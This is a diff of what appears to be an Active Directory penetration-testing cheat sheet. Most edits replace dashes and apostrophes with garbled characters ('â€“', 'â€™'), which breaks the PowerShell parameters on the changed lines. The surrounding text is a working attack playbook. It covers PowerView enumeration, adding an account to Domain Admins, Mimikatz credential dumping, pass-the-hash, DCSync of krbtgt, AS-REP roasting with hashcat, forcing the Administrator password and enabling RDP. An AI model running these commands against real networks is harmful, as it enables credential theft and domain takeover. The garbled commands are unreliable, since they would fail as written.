@@ -149,7 +149,7 @@ Unattend credentials are stored in base64 and can be decoded manually with base6
 $ echo "base64coded"  | base64 -d 
 
 IIS Web config
-Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
+Get-Childitem â€“Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 C:\inetpub\wwwroot\web.config
 
@@ -219,11 +219,11 @@ Get-DomainUser
 Get-DomainUser -SPN
 
 #Get list of all properties for users in the current domain
-Get-DomainUser –Properties pwdlastset
+Get-DomainUser â€“Properties pwdlastset
 Get-DomainUser -Properties samaccountname,description
-Get-DomainUser –Properties lastlogon
-Get-DomainUser –Properties description
-Get-DomainUser –Properties badpwdcount
+Get-DomainUser â€“Properties lastlogon
+Get-DomainUser â€“Properties description
+Get-DomainUser â€“Properties badpwdcount
 
 # all enabled users, returning distinguishednames
 Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
@@ -236,7 +236,7 @@ Get-DomainUser -UACFilter ACCOUNTDISABLE
 Get-DomainGroup
 Get-DomainGroupMember -Name "Domain Admins"
 
-Get-DomainGroup –Domain <targetdomain>
+Get-DomainGroup â€“Domain <targetdomain>
 Get-DomainGroupMember -Name "Domain Admins"
 
 #Get all the members of the Domain Admins group
@@ -246,12 +246,12 @@ Get-DomainOU
 Get-NetGroupMember -GroupName "Enterprise Admins" -Domain <DOmain name here>
 
 #Get the group membership for a user:
-Get-DomainGroup –UserName "hacker"
+Get-DomainGroup â€“UserName "hacker"
 
 3. Computers enumeration
 Get-DomainComputer
 Get-DomainComputer -FindOne | Find-DomainObjectPropertyOutlier
-Get-DomainComputer –OperatingSystem "*Server 2012*"
+Get-DomainComputer â€“OperatingSystem "*Server 2012*"
 Get-DomainComputer  -Ping
 Get-DomainComputer -Name "computer-name"
 
@@ -279,24 +279,24 @@ Get-DomainGPO -Name "{AB306569-220D-43FF-B03B83E8F4EF8081}"
 
 5. File Shares in the domain  ------ most important as 70-80% chances u will get a lot of stored information specially by marketing and sales teams
 #Find shares on hosts in current domain.
-Find-DomainShare –Verbose
+Find-DomainShare â€“Verbose
 
 #Get all fileservers of the domain
 Get-DomainFileServer -Verbose
 
 #Find Non Standard Shares
-Find-DomainShare –Verbose -ExcludeStandard -ExcludeIPC -ExcludePrint
+Find-DomainShare â€“Verbose -ExcludeStandard -ExcludeIPC -ExcludePrint
 
 #Find sensitive files on computers in the domain
-Invoke-FileFinder –Verbose
+Invoke-FileFinder â€“Verbose
 
 6. ACLs -- Access Controls lists -- simple terms what rights u have on the domain
 #Get the ACLs associated with the specified object
-Get-ObjectAcl -SamAccountName hacker –ResolveGUIDs
+Get-ObjectAcl -SamAccountName hacker â€“ResolveGUIDs
 
 
 #GenericWrite for all users > under advanced > Write all properties
-Get-ObjectAcl -SamAccountName * –ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }
+Get-ObjectAcl -SamAccountName * â€“ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603') }
 
 #Add user to domain admin
 net user hacker /domain; Add-DomainGroupMember -Identity 'Domain Admins' -Members 'hacker' -Domain "hacked"; net user hacker /domain
@@ -305,7 +305,7 @@ net user hacker /domain; Add-DomainGroupMember -Identity 'Domain Admins' -Member
 7. User Domain Hunting:
 
 #Find all machines on the current domain where the current user has local admin access
-Test-AdminAccess –Verbose
+Test-AdminAccess â€“Verbose
 
 #Tools
 https://raw.githubusercontent.com/admin0987654321/admin1/master/Find-WMILocalAdminAccess.ps1
@@ -315,7 +315,7 @@ FindPSRemotingLocalAdminAccess.ps1
 
 #Find local admins on all machines of the domain 
 #(needs administrator privs on non-dc machines).
-Find-DomainLocalGroupMember –Verbose
+Find-DomainLocalGroupMember â€“Verbose
 
 #Find computers where a domain admin (or specified user/group) has sessions:
 Find-DomainUserLocation
@@ -352,7 +352,7 @@ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpa
 
 3. Pass the Hash Attack
 
-A Pass-the-Hash (PtH) attack is a very common method, where an attacker captures the password NTLM hash and then simply passes it to different computer to login. Attackers commonly obtain hashes by scraping a system’s memory and other techniques such as SMBrelay.
+A Pass-the-Hash (PtH) attack is a very common method, where an attacker captures the password NTLM hash and then simply passes it to different computer to login. Attackers commonly obtain hashes by scraping a systemâ€™s memory and other techniques such as SMBrelay.
 
 Import-Module .\Invoke-Mimikatz 
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:hacker /domain: /ntlm: /run:powershell.exe"'
@@ -462,7 +462,7 @@ sc.exe <FQDN of DC> stop dns
 sc.exe <FQDN of DC> start dns
 
 3.  DCSync
-DCSync is a credential dumping technique that can lead to the compromise of individual user credentials, or more precisely to create a Golden Ticket, as DCSync can be used to compromise the krbtgt account’s password.
+DCSync is a credential dumping technique that can lead to the compromise of individual user credentials, or more precisely to create a Golden Ticket, as DCSync can be used to compromise the krbtgt accountâ€™s password.
 
 To perform a DCSync attack, the attacker must have the Replicating Directory Changes All and Replicating Directory Changes privileges. 
 
@@ -567,7 +567,7 @@ $SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force
 
 $Cred = New-Object System.Management.Automation.PSCredential('<system-name>\dfm.a', $SecPassword) 
 
-Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\<share-drive-path>\program2.exe'}  -Credential $Cred -Verbose 
+Set-DomainObject -Identity testuser -Set @{'scriptpath'='\\<share-drive-path>\program2.exe'}Â  -Credential $Cred -Verbose 
 
 Get-DomainUser -Identity testuser -Properties scriptpath
 
@@ -601,7 +601,7 @@ Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -ma
 Get-ObjectAcl -SamAccountName * -ResolveGUIDs | ? {($_.ActiveDirectoryRights -match 'GenericWrite') -and ($_.SecurityIdentifier -match 'SID')}
 
 #Disable the DoesnotRequirePreAuth:
-Set-DomainObject -Identity hacker -XOR @{useraccountcontrol=ID value} –Verbose
+Set-DomainObject -Identity hacker -XOR @{useraccountcontrol=ID value} â€“Verbose
 
 #Export Hashes
 .\Rubeus.exe asreproast /format:hashcat /outfile:hacker-hash.asreproast
@@ -612,7 +612,7 @@ hashcat -m 18200 --force -a 0 hacker-hash.asreproast passwords.txt
 
 
 #Set it back to normal
-Set-DomainObject -Identity hacker -XOR @{useraccountcontrol=512} –Verbose
+Set-DomainObject -Identity hacker -XOR @{useraccountcontrol=512} â€“Verbose
 
 ===================================================================================================
 Domain Persistence:
@@ -744,7 +744,7 @@ Enter-PSsession $sess
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 
 #Get krbtgt silently
-The DCSync is a mimikatz feature which will try to impersonate a domain controller and request account password information from the targeted domain controller. This technique is less noisy as it doesn’t require direct access to the domain controller or retrieving the NTDS.DIT file over the network.
+The DCSync is a mimikatz feature which will try to impersonate a domain controller and request account password information from the targeted domain controller. This technique is less noisy as it doesnâ€™t require direct access to the domain controller or retrieving the NTDS.DIT file over the network.
 
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:dc-hacked\krbtgt"'
 
@@ -852,14 +852,14 @@ Import-Module .\PowerView.ps1
 Set-DomainUserPassword -Identity Administrator -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
 
 #Enter Session with new password
-Enter-PSSession –Computername ad –credential hacked\Administrator
+Enter-PSSession â€“Computername ad â€“credential hacked\Administrator
 
-
-----------#Extra-------
 #Enable Remote Desktop
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+
 #Activate the firewall rule
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
 #Enable authentication via RDP
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
 
